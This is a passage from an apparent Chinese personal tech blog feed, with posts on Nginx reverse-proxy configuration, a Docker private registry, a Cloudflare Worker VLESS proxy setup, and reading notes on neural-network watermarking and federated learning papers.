命令进行配置，可以指定一些编译参数</li><li>然后执行 <code>make</code> 命令编译源码</li><li>最后执行 <code>make install</code> 命令进行安装</li></ul></li><li><p>使用第三方工具安装：</p><ul><li>一些 Linux 发行版提供了一键安装脚本或工具来方便安装 Nginx，比如 OpenResty、Nginx Plus 等</li></ul></li></ol><p>安装完成后可以使用 <code>nginx -v</code> 命令来查看 Nginx 的版本信息，使用 <code>nginx -t</code> 命令来测试配置文件的语法是否正确，使用 <code>systemctl start nginx</code> 命令来启动 Nginx 服务。</p><p>在终端中使用<code>nginx -t</code> 命令检查Nginx配置文件是否有语法错误时，终端也会输出配置文件路径。默认情况下，配置文件地址为“程序目录&#x2F;conf&#x2F;nginx.conf”，即配置文件通常放在目录 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf（源码安装默认路径），&#x2F;etc&#x2F;nginx&#x2F;conf （包管理工具安装默认路径）或 &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;conf 中。）</p><pre><code>lab@bit-PowerEdge-R740xd:~$ sudo nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful</code></pre><h3 id="Nginx-配置文件"><a href="#Nginx-配置文件" class="headerlink" title="Nginx 配置文件"></a>Nginx 配置文件</h3><h4 id="文件结构与内容"><a href="#文件结构与内容" class="headerlink" title="文件结构与内容"></a>文件结构与内容</h4><p>配置文件由一些指令控制模块组成，其决定了 nginx 及其模块的工作方式。</p><blockquote><p>指令可分为简单指令和块指令。一个简单的指令是由空格分隔的名称和参数组成，并以分号 ; 结尾。块指令具有与简单指令相同的结构，但不是以分号结尾，而是以大括号{}包围的一组附加指令结尾。如果块指令的大括号内部可以有其它指令，则称这个块指令为上下文（例如：events，http，server 和 location）。<br>配置文件中被放置在任何上下文之外的指令都被认为是主上下文 main。events 和 http 指令在主 main 上下文中，server 在 http 中，location 又在 server 中</p></blockquote><p>配置文件nginx.conf内容如下：</p><pre><code>user www-data;worker_processes auto;pid /run/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events &#123;        worker_connections 768;        # multi_accept on;&#125;http &#123;        ##        # Basic Settings        ##        sendfile on;        tcp_nopush on;        types_hash_max_size 2048;        # server_tokens off;        # server_names_hash_bucket_size 64;        # server_name_in_redirect off;        include /etc/nginx/mime.types;        default_type application/octet-stream;        ##        # SSL Settings        ##        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE        ssl_prefer_server_ciphers on;        ##        # Logging Settings        ##        access_log /var/log/nginx/access.log;        error_log /var/log/nginx/error.log;        ##        # Gzip Settings        ##        gzip on;        # gzip_vary on;        # gzip_proxied any;        # gzip_comp_level 6;        # gzip_buffers 16 8k;        # gzip_http_version 1.1;        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;        ##        # Virtual Host Configs        ##        include /etc/nginx/conf.d/*.conf;        include /etc/nginx/sites-enabled/*;&#125;                                     </code></pre><p>常见的配置项含义如下：</p><ul><li>user：指定 Nginx worker 进程运行的用户和用户组</li><li>worker_processes：指定 Nginx 启动时创建的 worker 进程数量</li><li>error_log：指定错误日志文件的路径</li><li>pid：指定 Nginx 主进程的 PID 文件路径</li><li>events：指定 Nginx 事件模块的配置，如 worker_connections（每个 worker 进程的最大连接数）</li><li>http：指定 HTTP 模块的配置，包括 server（定义虚拟主机）、upstream（定义负载均衡）、location（定义 URL 匹配规则）等配置项</li><li>server：定义一个虚拟主机，包括监听的端口、域名、SSL 配置等</li><li>location：定义 URL 匹配规则，包括匹配的 URL 路径、反向代理配置、缓存配置等</li><li>access_log：指定访问日志文件的路径</li><li>root：指定网站根目录的路径</li><li>index：指定默认的首页文件</li><li>include：包含其他配置文件</li><li>upstream：定义负载均衡的后端服务器</li><li>proxy_pass：指定反向代理的目标地址</li><li>ssl_certificate &#x2F; ssl_certificate_key：指定 SSL 证书和私钥的路径</li><li>gzip：开启或关闭 HTTP 响应的压缩</li><li>server_name：指定虚拟主机的域名</li><li>error_page：定义错误页面的处理方式</li><li>rewrite：重定向 URL 请求</li><li>limit_req_zone &#x2F; limit_req：限制请求速率</li></ul><p>如果虚拟主机的配置也在该文件，不便于管理。因此，通常使用<code>include /etc/nginx/conf.d/*.conf;</code>引入，并在<code>/etc/nginx/conf.d/</code>目录下创建对应的域名配置文件。</p><p>在外网使用域名访问网站服务时，请求过程为：外网域名 -&gt; 外网服务器:80&#x2F;443 -&gt; 外网请求映射到内网 -&gt; Nginx反向代理 -&gt; 内网前端:xx（前端显示） -&gt; （发出请求） -&gt; 外网域名 -&gt; 外网服务器:80 -&gt; 内网前端:xx -&gt; Nginx反向代理 -&gt; 内网后端</p><p>具体地，当使用域名访问时，根据DNS记录，域名被解析为对应的外网IP。HTTP默认访问80端口，HTTPS访问443端口，因此客户端对<code>http://xxx.com</code>的请求会被映射到外网IP:80上，对<code>https//xxx.com</code>的请求则映射到外网IP:443上。</p><p>经过NAT转换将外网映射到内网服务器监听端口，内网服务器上的Nginx服务监听到请求后，将该端口的请求转发至内网前端服务运行端口。此时，可以通过域名访问前端页面，并查看页面的静态内容，之后，前端向内网后端发起请求加载动态内容。</p><h4 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h4><p>将来自<code>www.example.com</code>域名的HTTP请求通过Nginx代理转发至本地的<code>127.0.0.1:806</code>地址，实现反向代理。Nginx配置文件如下：</p><pre><code>#httpserver &#123;    listen 80;    server_name www.example.com;    location / &#123;        proxy_set_header HOST $host;        proxy_set_header X-Forwarded-Proto $scheme;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;                # 代理地址        proxy_pass http://127.0.0.1:806/;    &#125;&#125;</code></pre><p>实现对前端和后端API服务的反向代理和HTTPS加密配置，同时设置访问日志和错误日志的记录路径等功能。例如：其中<code>dev.redamancy.tech</code>对应前端服务，<code>api-dev.redamancy.tech</code>对应后端API服务，内网前端服务在800端口，内网后端服务在8082端口，前端Nginx配置文件<code>frontend.dev.redamancy.tech.conf</code>内容如下：</p><pre><code>upstream dev-redamancy.tech &#123;    server 127.0.0.1:800;&#125;# httpsserver &#123;    listen 443  ssl;    server_name  dev.redamancy.tech;    include mime.types;    gzip on;    gzip_min_length 256;    gzip_comp_level 4;    gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript application/javascript text/x-js;    # ssl configurations    ssl_certificate /etc/nginx/cert/xxx.crt;    ssl_certificate_key /etc/nginx/cert/xxx.key;    ssl_protocols TLSv1.2 TLSv1.3;    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;    ssl_prefer_server_ciphers on;    access_log  /etc/nginx/logs/dev-redamancy.tech_access.log;    error_log   /etc/nginx/logs/dev-redamancy.tech.log error;    #static    location / &#123;        proxy_pass http://dev-redamancy.tech;    &#125;    error_page 405 =200 http://$host$request_uri;    underscores_in_headers on;&#125;server &#123;    listen 80;    server_name dev.redamancy.tech;    rewrite ^(.*) https://$server_name$1 permanent;&#125;</code></pre><p>后端Nginx配置文件api.dev.redamancy.tech.conf内容如下：</p><pre><code>upstream api.dev-redamancy.tech &#123;   server 127.0.0.1:8082;&#125;server &#123;   listen 443 ssl;   server_name api-dev.redamancy.tech;   client_max_body_size 100M;   gzip off;   #gzip_min_length 256;   #gzip_comp_level 4;   #gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript application/javascript text/x-js;   # ssl configurations   ssl_certificate /etc/nginx/cert/xxx.crt;   ssl_certificate_key /etc/nginx/cert/xxx.key;   ssl_protocols TLSv1.2 TLSv1.3;   ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;   ssl_prefer_server_ciphers on;   proxy_max_temp_file_size 0;   proxy_set_header Host $host:$server_port;   proxy_set_header X-Real-IP $remote_addr;   proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;   proxy_set_header X-Forwarded-Host $host;   proxy_set_header X-Forwarded-Server $host;   proxy_set_header X-Forwarded-Proto  http;   #proxy_set_header Host $http_host;   #proxy_pass_request_headers on;   #proxy_set_header X-NginX-Proxy true;   #proxy_redirect off;   access_log  /etc/nginx/logs/api.dev-redamancy.tech_access.log;    error_log   /etc/nginx/logs/api.dev-redamancy.tech_error.log error;   location / &#123;       proxy_pass http://api.dev-redamancy.tech;   &#125;&#125;server &#123;    listen 80;    server_name api-dev.redamancy.tech;    rewrite ^(.*) https://$server_name$1 permanent;&#125;                                                            </code></pre><h4 id="重新加载配置"><a href="#重新加载配置" class="headerlink" title="重新加载配置"></a>重新加载配置</h4><p>Nginx 有一个主进程（Master）和几个工作进程（Worker）。主进程的主要目的是读取和评估配置，并维护工作进程。工作进程对请求进行处理。</p><p>若配置文件发生更改，可以重新启动Nginx使得配置生效，也可以将重新加载配置信号发送到 Nginx 的主进程。</p><p>nginx 启动之后，可以通过调用可执行文件附带 -s 参数 来控制，命令为<code>nginx -s 信号</code>。要重新加载配置，执行的命令为：<code>nginx -s reload</code>。</p><p>一旦主进程收到要重新加载配置的信号，它将检查新配置文件的语法有效性，并尝试应用其中提供的配置。如果成功，主进程将启动新的工作进程，并向旧工作进程发送消息，请求它们关闭。否则，主进程回滚更改，并继续使用旧配置。旧工作进程接收到关闭命令后，停止接受新的请求连接，并继续维护当前请求，直到这些请求都被处理完成之后，旧工作进程将退出。</p><p>参考资料：<br><a href="https://docs.nginx.com/">Nginx Docs</a><br><a href="https://docshome.gitbook.io/nginx-docs/">Nginx 中文文档</a><br><a href="https://blog.csdn.net/justinqin/article/details/119519019">nginx–正向代理、反向代理及负载均衡（图解+配置）</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读笔记 | 模型水印 FedIPR: Ownership Verification for Federated Deep Neural Network Models</title>
      <link href="/academic/34.html"/>
      <url>/academic/34.html</url>
      
        <content type="html"><![CDATA[<h3 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h3><ul><li>期刊：TPAMI （CCF A）</li><li>发表时间：2023.04</li><li>论文地址： [<a href="https://arxiv.org/pdf/2109.13236][1]">https://arxiv.org/pdf/2109.13236][1]</a></li><li>代码地址: [<a href="https://github.com/purp1eHaze/FedIPR][2]">https://github.com/purp1eHaze/FedIPR][2]</a></li></ul><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>联邦学习模型是在多方拥有的有价值的训练数据基础上协作开发的。在联邦模型的开发和部署过程中，它们面临着非法复制、重新分发、滥用和搭便车等风险。为了解决这些风险，联邦学习模型的所有权验证是保护联邦学习模型知识产权（IPR）的先决条件，即，FedIPR。我们提出了一种新的联邦深度神经网络（FedDNN）所有权验证方案，允许嵌入和验证私有水印，以声称FedDNN模型的合法知识产权。在该方案中，每个客户端独立地验证模型水印的存在性，并声称各自的联邦模型的所有权，而不透露私人训练数据，也没有私人水印信息。嵌入式水印的有效性在理论上是合理的，因为我们对水印可以被私自嵌入并被多个客户端检测到的条件进行了严格分析。此外，对计算机视觉和自然语言处理任务的大量实验结果表明，可以嵌入和可靠地检测不同位长的水印，而不会影响原始模型的性能。我们的水印方案还能适应各种联邦训练设置，并能抵御移除攻击。</p><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><ul><li>服务器初始化全局模型并下发至各客户端</li><li>客户端生成基于特征的白盒水印和基于后门的黑盒水印，最小化主任务、正则化项的组合损失函数，并将训练后的模型更新发送至服务器</li><li>服务器使用FedAvg方法聚合各客户端的模型更新</li><li>全局模型收敛后，客户端可以进行所有权验证</li><li>黑盒水印验证：客户端检查由触发样本生成的指定标签的检测误差是否小于设定值</li><li>白盒水印验证：提取水印与指定水印进行匹配，距离度量使用汉明距离，计算检测率</li></ul><p>（慢慢将PPT的内容整理。。以下不完整）</p><h3 id="方法设计"><a href="#方法设计" class="headerlink" title="方法设计"></a>方法设计</h3><h4 id="水印生成"><a href="#水印生成" class="headerlink" title="水印生成"></a>水印生成</h4><p>客户端$k \in {1,…,𝐾}$，通过$𝒢()→(𝑩<em>𝑘,𝜃_𝑘,𝑻_𝑘)$，生成目标水印$𝑩_𝑘$、水印提取参数$𝜃_𝑘&#x3D;{𝑺_𝑘,𝑬_𝑘 }$ （ $𝑺_𝑘$  表示水印的位置， $𝑬_𝑘$  表示水印的秘密嵌入矩阵）、触发集$𝐓_𝑘&#x3D;{(X</em>{𝐓<em>𝑘}^1,Y</em>{𝐓<em>𝑘}^1 ),…,(X</em>{𝐓<em>𝑘}^{𝑁_𝑇},Y</em>{𝐓_𝑘}^{𝑁_𝑇} )}$</p><blockquote><p>白盒水印</p></blockquote><p>二进制字符串水印，$𝑩_𝑘 \in \</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读笔记 | 模型水印 Embedding Watermarks into Deep Neural Networks</title>
      <link href="/academic/31.html"/>
      <url>/academic/31.html</url>
      
        <content type="html"><![CDATA[<h3 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h3><ul><li>会议：ICMR （CCF B）</li><li>发表时间：2017.04</li><li>论文地址： <a href="https://arxiv.org/pdf/1701.04082">https://arxiv.org/pdf/1701.04082</a></li></ul><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>最近深度神经网络取得了重大进展。共享深度神经网络的训练模型对于这些系统的研究和开发的快速进展非常重要。同时，有必要<strong>保护共享训练模型的权利</strong>。为此，我们建议使用数字水印技术来保护知识产权，并在使用训练好的模型时检测知识产权侵权情况。首先，我们提出一个新问题：将水印嵌入深度神经网络。我们还定义了深度神经网络中水印的要求、嵌入情况和攻击类型。其次，我们提出了一个<strong>使用参数正则化器在模型参数中嵌入水印</strong>的通用框架。我们的方法不会损害放置水印的网络的性能，因为水印是在训练主机网络时嵌入的。最后，我们进行了全面的实验，以揭示水印深度神经网络作为这项新研究工作基础的潜力。我们表明，我们的框架可以<strong>在从头开始训练深度神经网络期间以及微调和提炼期间嵌入水印，而不会损害其性能。即使经过微调或参数修剪，嵌入的水印也不会消失；即使修剪了 65% 的参数，水印仍然完整</strong>。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>共享训练模型对于深度神经网络系统的研究和开发的快速发展非常重要。在这种情况下，有必要保护共享训练模型的权利。</p><h3 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h3><ul><li><p>我们提出了一个新问题：在深度神经网络中嵌入水印。我们还定义了水印深度神经网络的要求、嵌入情况和攻击类型。</p></li><li><p>我们提出了一种利用参数正则化器在模型参数中嵌入水印的通用框架。我们的方法不会影响网络的性能。</p></li><li><p>我们进行了全面的实验，以揭示深度神经网络水印的潜力。</p></li></ul><h3 id="问题公式化"><a href="#问题公式化" class="headerlink" title="问题公式化"></a>问题公式化</h3><p>给定一个有或没有训练参数的模型网络，我们定义的水印任务为：将 $T$ 位向量 $b \in ^T$ 嵌入到一层或多层的神经网络的参数中。我们将嵌入水印的神经网络称为宿主网络，并将宿主网络最初试图执行的任务称为原始任务。</p><h4 id="水印需求"><a href="#水印需求" class="headerlink" title="水印需求"></a>水印需求</h4>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker私有库搭建</title>
      <link href="/technique/28.html"/>
      <url>/technique/28.html</url>
      
        <content type="html"><![CDATA[<p>Docker官方维护了一个公共的镜像仓库Docker Hub，用户可以在其中找到各种镜像并进行下载使用。执行 docker pull 命令时，默认情况下会从 Docker Hub 上拉取镜像。除了 Docker Hub，用户也可以配置 Docker 从其他的镜像仓库拉取镜像，比如阿里云镜像仓库、腾讯云镜像仓库等。在执行 docker pull 命令时，可以通过在镜像名称前加上镜像仓库地址来指定从其他仓库拉取镜像。</p><p>Docker Hub虽然方便，但是有以下限制：</p><ul><li>需要internet连接，速度慢</li><li>所有人都可以访问</li><li>由于安全原因企业不允许将镜像放到外网</li></ul><p>除了公开镜像仓库之外，Docker也提供名称为 registry 的镜像用于搭建本地私有仓库。在内部网络搭建的 Docker 私有仓库可以使内网人员下载、上传都非常快速，不受外网带宽等因素的影响，同时不在内网的人员也无法下载镜像，并且私有仓库也支持配置仓库认证功能。因此，用户可以借此搭建自己的私有镜像仓库来存储和管理自己的镜像。</p><h3 id="配置私有仓库-无认证"><a href="#配置私有仓库-无认证" class="headerlink" title="配置私有仓库(无认证)"></a>配置私有仓库(无认证)</h3><h4 id="拉取私有仓库镜像"><a href="#拉取私有仓库镜像" class="headerlink" title="拉取私有仓库镜像"></a>拉取私有仓库镜像</h4><pre><code>docker pull registry</code></pre><h4 id="设置私有仓库参数"><a href="#设置私有仓库参数" class="headerlink" title="设置私有仓库参数"></a>设置私有仓库参数</h4><p>由于docker的私服库作了安全加固，通常不支持http的推送，因此需要配置支持本地私有库registry的http连接。</p><p>docker安装后默认没有daemon.json这个配置文件，需要进行手动创建，配置文件的默认路径：&#x2F;etc&#x2F;docker&#x2F;daemon.json。</p><p>在daemon.json添加私有库地址信息，<strong>让 Docker 信任私有仓库地址</strong>。</p><pre><code>vim /etc/docker/daemon.json</code></pre><pre><code>&#123;       &quot;insecure-registries&quot;:[&quot;主机IP:5000&quot;]&#125;</code></pre><p>修改参数后，重新加载配置信息及重启 Docker 服务。</p><pre><code>sudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><h4 id="运行registry容器"><a href="#运行registry容器" class="headerlink" title="运行registry容器"></a>运行registry容器</h4><p>拉取了registry镜像后，需要运行该镜像，构建本地私有服务器容器，此后本地镜像将会推送至该容器。</p><p>仓库默认创建在容器的&#x2F;var&#x2F;lib&#x2F;registry目录下，即推送至registry私有镜像仓库的文件会存储在&#x2F;var&#x2F;lib&#x2F;registry目录下。考虑到权限管理问题，在实际应用中通常需要自定义容器卷映射（将容器目录挂载到宿主机目录），以便与宿主机联调。</p><pre><code>docker run -id --name registry -p 5000:5000 -v /root/mydate/docker_registry:/var/lib/registry registry#查看运行的容器docker ps</code></pre><ul><li>-v ：添加数据卷，格式为：-v &#x2F;宿主机目录:&#x2F;容器内目录；<code>-v /root/mydate/docker_registry:/var/lib/registry</code> 将容器内 &#x2F;var&#x2F;lib&#x2F;registry 目录下的数据挂载至宿主机 &#x2F;root&#x2F;mydate&#x2F;docker_registry目录下</li><li>-p ：映射端口，指定容器端口绑定到主机相应主机端口；默认情况下Docker开放了5000端口，-p 5000:5000 将Docker内部默认端口映射到主机端口5000</li><li>–name ：容器命名，可自定义任何名称</li><li>-id : 以交互模式运行容器，并在后台运行</li></ul><p>容器运行后，可以进入registry容器查看容器目录下是否创建成功</p><pre><code>#查看运行的容器，查看registry的容器ID以及此时COMMAND，确认/bin/bash, bin/sh, bash, sh是否支持。docker ps#进入容器，在容器中开启一个交互模式的终端 -t: 分配一个伪终端docker exec -it 容器id /bin/shls /var/lib/</code></pre><p>也可以查看私有仓库镜像文件，在终端输入:</p><pre><code>curl http://主机ip:5000/v2/_catalog</code></pre><p>或者同一内网浏览器访问 http:&#x2F;&#x2F;主机ip:5000&#x2F;v2&#x2F;_catalog ，看到<code>&#123;&quot;repositories&quot;:[]&#125;</code> 表示私有仓库搭建成功并且内容为空。</p><h4 id="本地镜像构建"><a href="#本地镜像构建" class="headerlink" title="本地镜像构建"></a>本地镜像构建</h4><p>准备需要推送至私有镜像仓库的镜像，以构建本地项目镜像为例。</p><p>根据Dockerfile构建镜像</p><pre><code>docker build -t local-image:tag .# docker build -t lab_dev:1.0 .</code></pre><h4 id="推送本地镜像至私有库"><a href="#推送本地镜像至私有库" class="headerlink" title="推送本地镜像至私有库"></a>推送本地镜像至私有库</h4><p>先给镜像设置标签，再将镜像推送至私有仓库</p><pre><code>docker tag local-image:tagname new-repo:tagnamedocker push new-repo:tagname#docker tag lab_dev:1.0 主机ip:5000/lab_dev:1.0#docker push 主机ip:5000/lab_dev:1.0</code></pre><p>若推送成功，则访问私有镜像仓库（如上终端输入命令或浏览器输入地址），可以查看到刚刚的镜像信息<code>&#123;&quot;repositories&quot;:[&quot;lab_dev&quot;]&#125; </code> </p><p>参考资料：</p><p><a href="https://developer.aliyun.com/article/1416683">docker私有镜像仓库的搭建及认证</a></p><p><a href="https://blog.csdn.net/weixin_37926734/article/details/123279987">Docker入门：私有库（Docker Registry）简介及使用方法（防踩坑）</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cloudflare+worker搭建vless高速节点</title>
      <link href="/technique/27.html"/>
      <url>/technique/27.html</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Cloudflare账号</li><li>v2rayN或其他代理软件</li><li>自己的域名（可选，在无优选IP时用）</li></ul><h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><h3 id="worker创建"><a href="#worker创建" class="headerlink" title="worker创建"></a>worker创建</h3><p>登录cloudflare，在Workers and Pages中创建Worker应用程序。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/cloudflare_worker.png" alt="cloudflare worker"></p><p>部署脚本，名称可以随意选取<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker_script.png" alt="worker script"></p><p>部署后，选择刚刚部署的worker，快速编辑脚本，将<a href="https://github.com/zizifn/edgetunnel/blob/main/src/worker-vless.js">该脚本</a>复制，覆盖原hello world脚本。并修改其中的userID和ProxyIP。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-vless.png" alt="worker-vless.js"></p><p>userID就是UUID，UUID生成，有以下方法</p><ul><li><p>按照脚本注释所说</p><p><code>Press &quot;Win + R&quot;, input cmd and run:  Powershell -NoExit -Command &quot;[guid]::NewGuid()&quot;</code></p><p>即在命令行输入对应命令</p></li><li><p>V2rayN生成<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/v2rayN-uuid.png" alt="v2rayN uuid"></p></li><li><p>在线工具生成</p><p><a href="https://1024tools.com/uuid">https://1024tools.com/uuid</a></p><p><a href="https://it.huluohu.com/uuid-generator">https://it.huluohu.com/uuid-generator</a></p></li></ul><p>ProxyIP设置的IP或域名用于中转流量，而不是直接路由到使用Cloudflare的网站。如果没有设置ProxyIP，托管在Cloudflare的一些网站会无法访问。</p><p><a href="https://github.com/3Kmfi6HP">3Kmfi6HP</a>提供的CDN ProxyIP如下：</p><pre><code>cdn-all.xn--b6gac.eu.orgcdn.xn--b6gac.eu.orgcdn-b100.xn--b6gac.eu.orgedgetunnel.anycast.eu.orgcdn.anycast.eu.org</code></pre><p>UUID和ProxyIP设置后，保存并部署。</p><p>查看worker脚本603-626行的代码，vless和clash的节点配置信息如下。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-vless-setting.png" alt="worker-js comment"></p><p>其中hostname是worker设置的反代地址（name+Zone），即路由地址。userID为刚刚设置的UUID。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-host.png" alt="worker-host"></p><p>也可以在浏览器输入：https:&#x2F;&#x2F;你的hostname&#x2F;你的UUID<br>查看赋值后的节点配置信息。（由于workers.dev域名已被墙，因此无法直接访问）</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-vless-info.png" alt="worker setting"></p><h3 id="V2rayN添加节点"><a href="#V2rayN添加节点" class="headerlink" title="V2rayN添加节点"></a>V2rayN添加节点</h3><p>如上文提到的，workers.dev域名已无法直接访问，若也没有自己的域名，则只能使用http传输，无法使用443端口。需要使用<strong>优选ip</strong>进行反向代理。</p><p>以下是优选ip的测试工具，测试后选择一个可行IP即可：</p><pre><code>http://ip.flares.cloud/https://stock.hostmonit.com/CloudFlareYeshttps://vfarid.github.io/cf-ip-scanner/?max=30</code></pre><p>使用优选IP进行反向代理，则此时节点的配置信息需要修改，将服务器地址改为优选IP，端口改为80或2052，不勾选传输层安全TLS（为空）。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/vless-setting.png" alt="vless-seeting"></p><p>若有自己的域名，则可以通过<strong>自定义域名</strong>进行代理。<br>在Cloudflare-websites添加自己的域名</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/cloudflare-website.png" alt="cloudflare website"></p><p>将域名服务器更改为Cloudflare的域名服务器。即将cloudflare提供的域名服务器信息覆盖自己注册域名所在平台DNS管理中的域名服务器信息(以下以阿里云→Cloudflare为例)。域名服务器更换成功，Cloudflare会发送邮件通知。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/cloudflare-NS.png" alt="cloudflare NS"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/aliyun-DNS.png" alt="aliyun DNS"></p><p>并将原解析记录迁移至Cloudflare（即在Cloudflare添加原域名解析记录）。</p><p>此时，在worker中选择triggers中的自定义域，添加自己的（子）域名，例如vless.example.com，添加成功后，DNS解析记录也会新增一条类型为worker的记录。<br>通过自定义域名，可以使用TLS和443端口。<br>此时节点的配置信息，可以开启传输层安全，服务器地址、tls servername填写自定义域名，端口可以选择443、2083、8443、2087、2053、2096.</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/vless-domain.png" alt="vless custom domain"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.huluohu.com/posts/913/">https://www.huluohu.com/posts/913/</a><br><a href="https://www.thinkhubx.com/network-cf-worker/">https://www.thinkhubx.com/network-cf-worker/</a><br><a href="https://mailberry.com.cn/2023/07/use-cloudflare-workers-to-vless/">https://mailberry.com.cn/2023/07/use-cloudflare-workers-to-vless/</a></p>]]></content>
      
      
      <categories>
          
          <category> technique </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vless </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读笔记 | 模型水印 When Federated Learning meets Watermarking</title>
      <link href="/academic/26.html"/>
      <url>/academic/26.html</url>
      
        <content type="html"><![CDATA[<h3 id="论文信息"><a href="#论文信息" class="headerlink" title="论文信息"></a>论文信息</h3><ul><li>发表时间：2023.08</li><li>论文地址： <a href="https://arxiv.org/abs/2308.03573">https://arxiv.org/pdf/2308.03573</a></li></ul><p>摘要：联邦学习是一种允许多个参与者协作训练深度神经网络而无需集中数据的技术。除其他优点外，它具有隐私保护特性，这使得它在敏感环境中的应用具有吸引力，例如医疗保健或军事。虽然数据没有显式交换，但训练过程需要共享有关参与者模型的信息。这使得单个模型容易被恶意行为者盗窃或未经授权的分发。为了解决机器学习背景下的所有权保护问题，深度神经网络水印方法在过去五年中得到了发展。大多数现有的工作集中在水印的方式，但只有少数方法已被设计为联邦学习及其独特的约束。在本文中，我们概述了联邦学习水印的最新进展，阐明了该领域出现的新挑战和机遇。</p><ul><li>机器学习<ul><li>问题<ul><li>敏感信息可能暴露给未经授权的实体</li><li>训练模型的知识产权问题，外部方盗窃、剽窃和未经授权的使用</li></ul></li><li>解决<ul><li>联邦学习允许多个数据所有共同训练全局模型，无需直接共享他们的私有数据</li><li>模型水印嵌入模型中，在非法模型泄露的情况下能够追踪来源<ul><li>大多数仅解决局部&#x2F;集中训练的问题<ul><li>如何识别参与方对联邦学习做出了贡献</li><li>如何确保最终模型不会被聚合方滥用</li></ul></li></ul></li></ul></li></ul></li><li>联邦学习<ul><li>框架<ul><li>中心-服务器</li><li>无中心服务器，对等（随机选择客户端作为聚合器）</li><li>Split-Learning<ul><li>在服务器和客户端之间分裂模型，常见的是U型配置：每个客户端有第一层和最后一层，服务器有剩余的层</li></ul></li></ul></li><li>目的<ul><li>确保客户端数据的安全性和隐私性，同时实现与集中式训练相当的模型性能</li></ul></li><li>威胁<ul><li>假设服务器是诚实但好奇的，它将遵循关于客户端选择和全局模型聚合&#x2F;分发的协议，但尝试推断关于客户端数据的信息<ul><li>反转攻击<ul><li>从参与方共享的梯度中重建用户学习的数据</li><li>防御方法<ul><li>同态加密<ul><li>缺点<ul><li>高计算和通信复杂度</li><li>只允许对加密数据执行线性运算，限制了聚合的范围</li></ul></li></ul></li><li>差分隐私<ul><li>缺点<ul><li>难以平衡隐私与模型性能</li></ul></li></ul></li><li>可信执行环境<ul><li>缺点</li><li><ul><li>资源消耗</li></ul></li></ul></li><li>安全多方计算<ul><li>缺点<ul><li>效率低</li></ul></li></ul></li></ul></li></ul></li></ul></li><li>假设客户端是恶意的，引入恶意数据破坏模型的训练，导致模型错误地将特定模式地数据分类，同时保持其在主要任务上的性能<ul><li>中毒攻击（后门攻击）</li><li>具有鲁棒性的聚合方法<ul><li>中值聚合</li><li>Krum聚合</li><li>修剪均值聚合</li></ul></li><li>异常检测<ul><li>执行模型聚合前过滤掉异常的客户端更新</li></ul></li></ul></li></ul></li><li>安全FL环境的建立